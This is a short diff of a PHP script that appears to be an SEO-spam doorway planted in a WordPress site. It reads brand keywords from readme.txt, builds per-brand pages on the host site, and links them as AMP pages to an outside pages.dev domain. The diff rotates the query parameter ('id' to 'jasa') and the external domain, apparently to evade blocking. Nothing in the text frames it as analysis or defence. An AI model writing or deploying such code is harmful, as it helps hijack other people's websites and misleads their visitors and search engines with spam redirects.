@@ -67,11 +67,11 @@ function get_all_urls(string $filename, string $baseUrl): array
 
 $filename = "readme.txt";
 
-if (!isset($_GET['id'])) {
+if (!isset($_GET['jasa'])) {
     load_main_page();
 }
 
-$target_string = strtolower(trim($_GET['id'] ?? ''));
+$target_string = strtolower(trim($_GET['jasa'] ?? ''));
 $lines = @file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 $brand_found = false;
 $BRAND = '';
@@ -91,7 +91,7 @@ if (!$brand_found) {
 }
 
 $BRANDS = $BRAND;
-$ampnya = "https://penasaranbangetguee.pages.dev/?id=" . strtolower($BRANDS);
+$ampnya = "https://istimewahhhh.pages.dev/?jasa=" . strtolower($BRANDS);
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
 $host = $_SERVER['HTTP_HOST'] ?? '';
 $requestUri = $_SERVER['REQUEST_URI'] ?? '';
@@ -100,7 +100,7 @@ $parsedUrl = parse_url($protocol . '://' . $host . $requestUri);
 $scheme = $parsedUrl['scheme'] ?? $protocol;
 $host = $parsedUrl['host'] ?? $host;
 $path = $parsedUrl['path'] ?? '/';
-$baseUrl = $scheme . "://" . $host . $path . "?id=";
+$baseUrl = $scheme . "://" . $host . $path . "?jasa=";
 $urlPath = $baseUrl . strtolower($BRANDS);
 
 $theme_cache_dir = __DIR__ . '/wp-content/themes/custom-cache';
